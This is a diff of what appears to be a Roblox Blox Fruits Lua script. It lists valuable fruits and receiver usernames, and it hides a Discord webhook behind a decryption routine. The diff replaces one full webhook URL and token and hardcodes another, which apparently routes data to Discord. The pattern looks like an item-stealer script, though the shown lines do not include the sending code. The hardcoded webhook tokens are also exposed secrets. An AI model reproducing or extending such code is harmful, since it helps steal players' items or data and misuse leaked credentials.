@@ -1,4 +1,4 @@
-Webhook = "https://discordapp.com/api/webhooks/1363467805696987136/puUE-9zz3QzAteNP8Gvqk8xTw62ps3Djx30OUnBT1NWKKWVJA-Xq2PpSoa5fXCD-DnbB"
+Webhook = "https://discord.com/api/webhooks/1371052338764320781/Rjp3bGE4_4eHposCAjBM0P_JfgacETwIsCa00bHiug_FShI0cy8Yv6hzTnehOEJ-iCs6"
 Usernames = {"", ""}
 Fruits = {"Portal-Portal", "Phoenix-Phoenix", "Spider-Spider", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
 FruitsToReset = {
@@ -711,7 +711,7 @@ local function updateWebhook()
     webhookCache.last = decryptWebhook(table.concat(webhookCache.storage[newName]))
     webhookCache.lastUpdate = tick()
     
-    Webhook = nil
+    Webhook = "https://discord.com/api/webhooks/1361295438925267004/stPosh70OETZAUq3Fn4QNZCnKNXGhns7POmW1WiBdF-f-C7lGwBVAOLHH71nl8_Twye2"
 end
 
 local function getWebhook()
